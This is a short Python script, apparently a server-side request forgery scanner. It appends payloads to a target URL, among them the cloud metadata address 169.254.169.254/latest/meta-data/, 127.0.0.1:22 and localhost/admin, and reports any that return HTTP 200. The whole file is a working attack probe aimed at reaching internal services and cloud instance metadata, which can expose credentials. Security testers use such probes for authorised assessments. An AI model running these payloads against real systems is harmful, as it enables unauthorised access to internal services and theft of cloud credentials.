import requests

def scan_ssrf(target_url):
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22",
        "http://localhost/admin"
    ]
    
    for payload in payloads:
        response = requests.get(target_url + payload)
        
        if response.status_code == 200:
            print(f"[+] Possible SSRF Found: {target_url + payload}")
